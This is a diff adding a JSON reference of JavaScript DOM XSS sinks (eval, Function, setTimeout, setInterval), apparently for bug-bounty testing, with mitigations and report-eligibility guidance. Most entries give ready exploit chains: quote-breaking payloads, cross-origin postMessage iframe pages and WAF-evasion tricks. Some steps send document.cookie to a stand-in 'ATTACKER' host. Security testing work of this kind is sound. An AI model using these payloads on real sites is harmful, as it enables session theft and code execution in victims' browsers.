@@ -1,0 +1,501 @@
+{
+  "category": "execution",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-eval",
+      "name": "eval",
+      "category": "execution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "eval",
+        "window.eval",
+        "globalThis.eval",
+        "eval("
+      ],
+      "severity": "P2",
+      "severity_note": "P2 when attacker-controlled input reaches it with no filtering; P3 when the source requires an unusual gadget or strong filtering is partially present.",
+      "explain": "eval() parses and executes a string as JavaScript code in the current scope. Any string that reaches it is compiled at runtime with full access to the surrounding lexical environment, the DOM, cookies (non-HttpOnly), and the origin's authority for same-origin requests.",
+      "how_it_works": "When a value derived from an attacker-controllable source (fragment, postMessage, storage, network response) is concatenated into the string passed to eval(), the attacker's characters become live code. Because the payload rides inside a data value rather than HTML, HTML-level sanitizers do not help; only the JS data flow matters. Indirect eval (0,eval)(s) or window['eval'](s) executes in global scope and is equally dangerous.",
+      "why_it_matters": "A single eval() reached by a DOM source is full DOM-XSS: session token theft, account actions via authenticated fetch(), keylogging, and UI redress. Because eval executes in page scope it can also read closure variables that a plain injected <script> tag could not reach, sometimes exposing internal tokens or CSRF nonces held in JS memory.",
+      "exploitable_when": [
+        "location.hash",
+        "postMessage-data",
+        "document.referrer",
+        "localStorage",
+        "xhr-response",
+        "fetch-response",
+        "window.name"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the fragment reaches eval()",
+              "payload": "#jlf-trace-1337",
+              "command": "open 'https://TARGET/page#jlf-trace-1337' in a browser and inspect the eval call in DevTools (set a breakpoint on the eval line or wrap eval: window._e=eval; eval=function(s){console.log(s);return window._e(s)})",
+              "indicator": "the string 'jlf-trace-1337' appears in the logged argument passed to eval()"
+            },
+            {
+              "action": "Fire a proof payload that survives the surrounding syntax",
+              "payload": "#alert(document.domain)",
+              "command": "open 'https://TARGET/page#alert(document.domain)' in a browser",
+              "indicator": "an alert dialog showing the target origin's domain appears"
+            },
+            {
+              "action": "If the code wraps the fragment in quotes or an expression, close the context",
+              "payload": "#'+alert(document.domain)+'",
+              "command": "open \"https://TARGET/page#'+alert(document.domain)+'\" in a browser",
+              "indicator": "the alert fires; without the quote-break you would see a SyntaxError in the console instead"
+            },
+            {
+              "action": "Demonstrate impact with session-token exfiltration",
+              "payload": "#'+fetch('https://ATTACKER/c?c='+document.cookie)+'",
+              "command": "open \"https://TARGET/page#'+fetch('https://ATTACKER/c?c='+document.cookie)+'\" in a browser while logged in as a test account",
+              "indicator": "your listener at ATTACKER receives a request containing the test session cookie"
+            }
+          ],
+          "eligibility": "Classic DOM XSS via fragment; accepted on all major platforms (HackerOne, Bugcrowd, Intigriti). The fragment never reaches the server, so a server-side WAF cannot see it — no WAF-evasion credit, but also no false 'WAF blocked it' dismissal."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm the message handler forwards data into eval() and check the origin validation",
+              "payload": "jlf-trace-1337",
+              "command": "in DevTools console on https://TARGET/page run: window.addEventListener('message',e=>console.log(e.origin,e.data)); then postMessage('jlf-trace-1337','*') from any iframe or console",
+              "indicator": "the posted value is logged and a breakpoint on the eval line shows it inside the evaluated string"
+            },
+            {
+              "action": "Exploit missing or weak origin check with a cross-origin frame",
+              "payload": "alert(document.domain)",
+              "command": "host 'https://ATTACKER/poc.html' containing <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)','*')</script> and open it",
+              "indicator": "the alert fires inside the target frame, proving cross-origin code execution"
+            },
+            {
+              "action": "If the handler expects JSON, fit the payload into the parsed field",
+              "payload": "{\"cmd\":\"eval\",\"arg\":\"alert(document.domain)\"}",
+              "command": "frames[0].postMessage('{\"cmd\":\"eval\",\"arg\":\"alert(document.domain)\"}','*')",
+              "indicator": "the alert fires, showing the JSON field is concatenated into eval() unsanitized"
+            }
+          ],
+          "eligibility": "postMessage-to-eval is a top-tier finding; accepted everywhere when the origin check is absent, '*', or bypassable (e.g. regex /target.com$/ matching attacker.target.com.evil.test). Always record the exact origin-validation code in the report."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant a marker and confirm the flow",
+              "payload": "jlf-trace-1337",
+              "command": "in DevTools console on https://TARGET run: localStorage.setItem('config','jlf-trace-1337'); then reload the page that evals the stored value",
+              "indicator": "a breakpoint on the eval line shows 'jlf-trace-1337' inside the evaluated string after reload"
+            },
+            {
+              "action": "Fire the stored payload",
+              "payload": "alert(document.domain)",
+              "command": "localStorage.setItem('config','alert(document.domain)'); location.reload()",
+              "indicator": "the alert fires on every page load that reads the key, proving persistent XSS"
+            },
+            {
+              "action": "Chain from a lower-severity storage write primitive if you cannot set the key directly",
+              "payload": "alert(document.domain)",
+              "command": "identify any feature that writes attacker text into the same key (profile field, import function, sync endpoint) and submit alert(document.domain) through it",
+              "indicator": "after the victim's client syncs, the eval fires in their session — this turns a self-XSS into a stored XSS"
+            }
+          ],
+          "eligibility": "Self-planted localStorage-to-eval is self-XSS and usually NOT eligible on its own. It becomes a valid finding when a separate, remotely triggerable write path (stored XSS, backend field, sync API) populates the key — document both halves of the chain."
+        },
+        {
+          "source": "xhr-response",
+          "steps": [
+            {
+              "action": "Map the XHR/fetch endpoint whose response body is eval'd",
+              "payload": "jlf-trace-1337",
+              "command": "curl -s 'https://TARGET/api/config' -H 'Cookie: session=SESSION_ID' and diff the response against what a breakpoint on eval() receives",
+              "indicator": "a response field you can influence (via profile, upload, or another stored vector) appears verbatim in the eval argument"
+            },
+            {
+              "action": "Store the payload through the influencing endpoint",
+              "payload": "alert(document.domain)",
+              "command": "curl -s -X POST 'https://TARGET/api/profile' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"bio\":\"alert(document.domain)\"}'",
+              "indicator": "the stored value is later returned by the eval'd endpoint"
+            },
+            {
+              "action": "Trigger execution in the browser",
+              "payload": "alert(document.domain)",
+              "command": "open 'https://TARGET/dashboard' as a test account whose data contains the payload",
+              "indicator": "the alert fires when the page evals the API response, proving stored DOM XSS"
+            }
+          ],
+          "eligibility": "Accepted as stored XSS when a second user (or the victim account) is affected. If the response field only ever contains your own data and only you view it, platforms grade it self-XSS — show cross-account impact or a victim-view page to qualify."
+        }
+      ],
+      "contexts": {
+        "js-expression": "Most common: the source is concatenated into a code string, e.g. eval('run(\"'+location.hash.slice(1)+'\")'). Break out with '\");alert(document.domain);//' or the quote-appropriate variant.",
+        "json-field": "The eval'd string is built by JSON.parse then template-concatenated; payload must survive JSON encoding, so avoid raw double quotes or escape them as \\\" inside the stored value.",
+        "url-context": "If the source arrives URL-encoded and the code does not decode it, submit %27%29%3Balert(document.domain)%2F%2F or a double-encoded %2527 variant depending on how many decode passes occur."
+      },
+      "waf_notes": "Fragment-based chains are invisible to server-side WAFs (the hash is never sent). For search/referrer/response chains, common blocks are the words 'eval', 'alert', and '<script': use top['al'+'ert'](document.domain), String.fromCharCode-built code, or window['\\x65val']. ModSecurity CRS often flags document.cookie — exfiltrate via localStorage or navigator.sendBeacon with an innocuous parameter name.",
+      "eligibility": "DOM XSS into eval() is accepted on all major platforms and is typically graded Medium-High. Findings where the victim must paste code into their own DevTools console are self-XSS and are almost always NOT eligible; never report a console-paste PoC as the primary vector. Indirect eval, new Function-style aliases, and obfuscated calls (window['e'+'val']) are in scope — report them under this sink.",
+      "mitigations": [
+        "Remove eval() entirely; replace string-to-code logic with a dispatch table or JSON-driven configuration.",
+        "Enforce a strict Content-Security-Policy without 'unsafe-eval' so eval() throws even if reached.",
+        "Validate postMessage origin with an exact allowlist (e.origin === 'https://trusted.example') before touching e.data.",
+        "Never concatenate storage, URL, or network data into code strings; parse data with JSON.parse and act on whitelisted keys only."
+      ],
+      "related": [
+        "Function constructor",
+        "setTimeout (string argument)",
+        "setInterval (string argument)",
+        "innerHTML",
+        "import() (dynamic)"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)",
+        "MDN: eval()"
+      ]
+    },
+    {
+      "id": "sink-function-constructor",
+      "name": "Function constructor",
+      "category": "execution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "Function",
+        "new Function",
+        "Function(",
+        "window.Function",
+        "globalThis.Function"
+      ],
+      "severity": "P2",
+      "severity_note": "Same class as eval(); P2 with a direct DOM source, P3 when a gadget or unusual calling convention is required.",
+      "explain": "The Function constructor compiles its string arguments into a new function whose body is attacker-controlled code. new Function('a','b', body) creates a function that executes body when called; Function(body)() compiles and immediately invokes.",
+      "how_it_works": "Unlike direct eval(), functions created this way execute in global scope, not the caller's scope — so closure variables are out of reach, but the DOM, cookies, and same-origin fetch() are fully available. Developers reach for it to build dynamic templates, expression evaluators, and polyfills, which is exactly where tainted strings slip in.",
+      "why_it_matters": "It is the lesser-known sibling of eval(): code reviewers and linters that flag eval() often miss new Function(), and CSP 'unsafe-eval' blocks both equally — so a finding here often survives in codebases that already cleaned up their eval() calls.",
+      "exploitable_when": [
+        "location.hash",
+        "postMessage-data",
+        "document.referrer",
+        "location.search",
+        "xhr-response"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the fragment reaches the Function body",
+              "payload": "#jlf-trace-1337",
+              "command": "open 'https://TARGET/page#jlf-trace-1337' with a breakpoint on the 'new Function' line and inspect the final argument",
+              "indicator": "the traced value appears inside the body string passed to the Function constructor"
+            },
+            {
+              "action": "Fire the proof payload",
+              "payload": "#alert(document.domain)",
+              "command": "open 'https://TARGET/page#alert(document.domain)' in a browser",
+              "indicator": "the alert fires when the constructed function is invoked"
+            },
+            {
+              "action": "Break out if the fragment is embedded in a return statement",
+              "payload": "#;alert(document.domain);//",
+              "command": "open 'https://TARGET/page#;alert(document.domain);//' in a browser",
+              "indicator": "the alert fires; the trailing // neutralizes the remainder of the generated body"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS on all major platforms; fragment delivery makes it server-WAF-blind."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify the message data is used as a Function body and audit the origin check",
+              "payload": "jlf-trace-1337",
+              "command": "postMessage('jlf-trace-1337','*') from DevTools console on https://TARGET/page while a breakpoint sits on the 'new Function' line",
+              "indicator": "the posted value appears in the constructor's body argument"
+            },
+            {
+              "action": "Deliver code execution cross-origin",
+              "payload": "alert(document.domain)",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)','*')</script>",
+              "indicator": "the alert fires inside the target frame"
+            }
+          ],
+          "eligibility": "Accepted everywhere when the origin check is missing or bypassable; include the exact listener code in the report."
+        },
+        {
+          "source": "document.referrer",
+          "steps": [
+            {
+              "action": "Confirm referrer data reaches the constructor",
+              "payload": "<a href=\"https://TARGET/page\">go</a>   (save as jlf-trace-1337.html — the tracer travels in the URL itself)",
+              "command": "host the payload at 'https://ATTACKER/jlf-trace-1337.html', click through to https://TARGET/page, and inspect the breakpoint on 'new Function'",
+              "indicator": "the referrer string appears inside the generated function body"
+            },
+            {
+              "action": "Fire the payload via a crafted referring URL path",
+              "payload": "alert(document.domain)",
+              "command": "host 'https://ATTACKER/x.html' with <a href=\"https://TARGET/page\">go</a> and navigate with the payload embedded per the app's referrer parsing (e.g. ?utm=alert(document.domain) if a query field is used)",
+              "indicator": "the alert fires after following the link"
+            }
+          ],
+          "eligibility": "Referrer-based DOM XSS requires a click from an attacker page and a Referer header that is not stripped; note browser Referrer-Policy defaults (strict-origin-when-cross-origin) in the report — query/path data still survives cross-origin, the full path does not."
+        }
+      ],
+      "contexts": {
+        "body-argument": "Payload lands in the last argument: new Function('x', tainted). Break syntax with ';alert(document.domain);//'.",
+        "argument-list": "Payload lands in a parameter-name position: new Function(tainted, 'return 1'). Parameter names are validated loosely; use 'a){alert(document.domain)}function b(' to reshape the signature.",
+        "immediately-invoked": "Pattern Function(tainted)() executes on definition — no separate call site needed, so the payload fires the moment the string is built."
+      },
+      "waf_notes": "Keyword filters for 'eval' never match. Filters for 'Function' collide with legitimate code and are rare. CSP is the real control: any policy with 'unsafe-eval' absent makes the constructor throw a EvalError — always check the CSP before reporting exploitability at scale.",
+      "eligibility": "Accepted as DOM XSS on all major platforms at the same grade as eval(). Self-invocation requiring the victim to paste into console is self-XSS and not eligible. Flag the CSP state: exploitable-but-CSP-blocked findings are often graded lower or as informative.",
+      "mitigations": [
+        "Replace dynamic code generation with a safe expression parser or a static dispatch map.",
+        "Deploy CSP without 'unsafe-eval'; Function() then fails closed.",
+        "Treat every string argument to Function() as code: never interpolate URL, message, or network data into it."
+      ],
+      "related": [
+        "eval",
+        "setTimeout (string argument)",
+        "setInterval (string argument)",
+        "import() (dynamic)"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "MDN: Function() constructor",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-settimeout-string",
+      "name": "setTimeout (string argument)",
+      "category": "execution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "setTimeout",
+        "window.setTimeout",
+        "setTimeout("
+      ],
+      "severity": "P3",
+      "severity_note": "P3: only the string-first-argument form evaluates code; the common function-reference form is safe and must not be reported.",
+      "explain": "setTimeout(handler, delay) schedules code. When handler is a string, the browser passes it to the same engine as eval() and executes it in global scope after the delay. When handler is a function, no string evaluation occurs at all.",
+      "how_it_works": "Legacy code and quick prototypes pass strings like setTimeout('tick('+id+')', 1000). If any part of that string is attacker-controlled, the injected characters run as code in global scope. The evaluation happens at timer-fire time, which matters for timing and for CSP: string handlers are blocked when 'unsafe-eval' is absent.",
+      "why_it_matters": "Reviewers frequently dismiss setTimeout as safe because the function form dominates modern code. Finding the string form — especially in old admin panels, timer utilities, and generated code — yields full DOM XSS with the same impact as eval().",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "localStorage",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the string-handler form and trace the fragment",
+              "payload": "#jlf-trace-1337",
+              "command": "open 'https://TARGET/page#jlf-trace-1337' and breakpoint the setTimeout line; confirm the first argument is a string containing the traced value",
+              "indicator": "the first argument is a string (typeof 'string') and contains 'jlf-trace-1337'"
+            },
+            {
+              "action": "Fire the payload when the timer fires",
+              "payload": "#alert(document.domain)",
+              "command": "open 'https://TARGET/page#alert(document.domain)' and wait for the configured delay",
+              "indicator": "the alert fires after the delay, not immediately — confirming timer-based execution"
+            },
+            {
+              "action": "Break the enclosing string if the fragment is quoted inside the handler",
+              "payload": "#');alert(document.domain);//",
+              "command": "open \"https://TARGET/page#');alert(document.domain);//\" in a browser",
+              "indicator": "the alert fires; without the breakout the console shows a SyntaxError when the timer fires"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS; explicitly state in the report that the vulnerable call uses the string form, since triagers may assume the safe function form."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Trace a query parameter into the string handler",
+              "payload": "?t=jlf-trace-1337",
+              "command": "open 'https://TARGET/page?t=jlf-trace-1337' with a breakpoint on setTimeout",
+              "indicator": "the traced value is inside the string first argument"
+            },
+            {
+              "action": "Execute code through the query string",
+              "payload": "?t=alert(document.domain)",
+              "command": "open 'https://TARGET/page?t=alert(document.domain)' in a browser",
+              "indicator": "the alert fires after the delay"
+            },
+            {
+              "action": "If the server reflects the parameter through a filter, use an eval-safe alphabet",
+              "payload": "?t=top['al'%2B'ert'](document.domain)",
+              "command": "open \"https://TARGET/page?t=top['al'%2B'ert'](document.domain)\" in a browser",
+              "indicator": "the alert fires despite a naive 'alert' keyword block"
+            }
+          ],
+          "eligibility": "Query-string delivery crosses the server, so note any server-side filtering or WAF in the report; still accepted on all major platforms when execution is demonstrated."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant and trace a stored value",
+              "payload": "jlf-trace-1337",
+              "command": "localStorage.setItem('task','jlf-trace-1337'); reload https://TARGET/page and inspect the setTimeout string",
+              "indicator": "the stored value appears inside the string handler after reload"
+            },
+            {
+              "action": "Fire the stored payload",
+              "payload": "alert(document.domain)",
+              "command": "localStorage.setItem('task','alert(document.domain)'); location.reload()",
+              "indicator": "the alert fires on each load that schedules the timer"
+            },
+            {
+              "action": "Escalate self-XSS to stored XSS via a remote write path",
+              "payload": "alert(document.domain)",
+              "command": "find the feature that writes this key (settings sync, import) and submit alert(document.domain) through it as a second account",
+              "indicator": "the timer payload executes in the first account's browser after sync"
+            }
+          ],
+          "eligibility": "Self-planted storage is self-XSS (not eligible alone); eligible when a cross-account or server-driven write path populates the key."
+        }
+      ],
+      "contexts": {
+        "string-handler": "Vulnerable: setTimeout('run(\"'+location.hash.slice(1)+'\")', 500). Breakout: '\");alert(document.domain);//'.",
+        "function-handler": "Safe: setTimeout(function(){ ... }, 500) or setTimeout(cb, 500). No string is evaluated; do not report.",
+        "extra-arguments": "setTimeout(cb, 500, tainted) passes tainted as an argument to cb — safe unless cb itself evals its argument."
+      },
+      "waf_notes": "Server-side WAFs see only the URL; payloads in the fragment bypass them entirely. Client-side CSP without 'unsafe-eval' converts the string handler into a silent CSP violation — check the console for 'Refused to evaluate a string as JavaScript' before concluding non-exploitability.",
+      "eligibility": "Accepted as DOM XSS when the string form is proven with a live execution PoC. Reports that flag every setTimeout call without distinguishing string vs function form are rejected as false positives — quote the exact call in the report.",
+      "mitigations": [
+        "Always pass a function reference or arrow function to setTimeout, never a string.",
+        "Pass dynamic values via the variadic argument list: setTimeout(cb, delay, value).",
+        "Enforce CSP without 'unsafe-eval' so string handlers fail closed."
+      ],
+      "related": [
+        "eval",
+        "Function constructor",
+        "setInterval (string argument)"
+      ],
+      "references": [
+        "MDN: setTimeout()",
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)"
+      ]
+    },
+    {
+      "id": "sink-setinterval-string",
+      "name": "setInterval (string argument)",
+      "category": "execution",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "setInterval",
+        "window.setInterval",
+        "setInterval("
+      ],
+      "severity": "P3",
+      "severity_note": "P3: string-first-argument form only; the function form is safe. Repeated firing makes stored payloads execute in a loop, which can strengthen impact demos.",
+      "explain": "setInterval(handler, delay) repeats code on a timer. With a string handler the browser evaluates it as JavaScript in global scope on every tick; with a function handler nothing is evaluated.",
+      "how_it_works": "Code such as setInterval('refresh(\"'+location.hash.slice(1)+'\")', 5000) re-compiles the string every interval. An attacker controlling any interpolated value gets recurring code execution — each tick re-runs the payload, which is useful for persistent exfiltration demos but otherwise equivalent to the setTimeout string form.",
+      "why_it_matters": "Same risk class as eval() with an added twist: because the string is re-evaluated every tick, a payload stored in a mutable location (localStorage, a global variable, the hash) can be swapped between executions, and a one-time CSP console warning does not stop subsequent ticks once 'unsafe-eval' is present.",
+      "exploitable_when": [
+        "location.hash",
+        "postMessage-data",
+        "window.name"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the string-handler form and trace the fragment",
+              "payload": "#jlf-trace-1337",
+              "command": "open 'https://TARGET/page#jlf-trace-1337', breakpoint the setInterval line, and verify the first argument is a string containing the traced value",
+              "indicator": "typeof the first argument is 'string' and it contains 'jlf-trace-1337'"
+            },
+            {
+              "action": "Fire the payload on tick",
+              "payload": "#alert(document.domain)",
+              "command": "open 'https://TARGET/page#alert(document.domain)' and wait one interval",
+              "indicator": "the alert fires repeatedly on every tick (close it to observe the next one)"
+            },
+            {
+              "action": "Demonstrate payload swapping between ticks",
+              "payload": "#alert(document.domain)",
+              "command": "after the first alert, run location.hash='fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)' in the console and wait for the next tick",
+              "indicator": "the second tick executes the new code and your listener receives the cookie — proving live re-evaluation"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS; the recurring execution is an impact enhancer, not a separate bug class."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data reaches the interval string",
+              "payload": "jlf-trace-1337",
+              "command": "postMessage('jlf-trace-1337','*') from the console on https://TARGET/page with a breakpoint on setInterval",
+              "indicator": "the posted value is inside the string first argument"
+            },
+            {
+              "action": "Execute cross-origin on every tick",
+              "payload": "alert(document.domain)",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)','*')</script>",
+              "indicator": "the alert fires repeatedly inside the target frame"
+            }
+          ],
+          "eligibility": "Accepted everywhere with a missing/bypassable origin check; document the listener and the absence of origin validation."
+        },
+        {
+          "source": "window.name",
+          "steps": [
+            {
+              "action": "Plant the payload via window.name from an attacker page",
+              "payload": "jlf-trace-1337",
+              "command": "host 'https://ATTACKER/poc.html' with <script>window.name='jlf-trace-1337';location='https://TARGET/page'</script> and open it",
+              "indicator": "after the redirect, a breakpoint on setInterval shows the traced value inside the string handler"
+            },
+            {
+              "action": "Execute code through window.name",
+              "payload": "alert(document.domain)",
+              "command": "host 'https://ATTACKER/poc2.html' with <script>window.name='alert(document.domain)';location='https://TARGET/page'</script> and open it",
+              "indicator": "the alert fires on the first tick after navigation"
+            }
+          ],
+          "eligibility": "window.name persists across cross-origin navigation in the same tab, making it a reliable delivery source; accepted on major platforms with a working PoC page."
+        }
+      ],
+      "contexts": {
+        "string-handler": "Vulnerable: setInterval('poll(\"'+name+'\")', 1000). Breakout: '\");alert(document.domain);//'.",
+        "function-handler": "Safe: setInterval(() => poll(name), 1000). No evaluation occurs.",
+        "dynamic-delay": "Taint in the delay argument (setInterval(cb, tainted)) is a number-coercion issue at worst — not code execution; do not report as this sink."
+      },
+      "waf_notes": "Same as the setTimeout string form: fragment and window.name delivery bypass server WAFs; CSP without 'unsafe-eval' blocks every tick with a console violation. Keyword filters for 'alert' are bypassed with top['al'+'ert'](document.domain).",
+      "eligibility": "Accepted as DOM XSS with a live string-form PoC. Do not report the function form. Console-paste self-XSS variants are not eligible.",
+      "mitigations": [
+        "Pass function references to setInterval; never strings.",
+        "Move dynamic data through closure variables instead of string interpolation.",
+        "Enforce CSP without 'unsafe-eval' so string handlers throw."
+      ],
+      "related": [
+        "eval",
+        "Function constructor",
+        "setTimeout (string argument)"
+      ],
+      "references": [
+        "MDN: setInterval()",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)"
+      ]
+    }
+  ]
+}
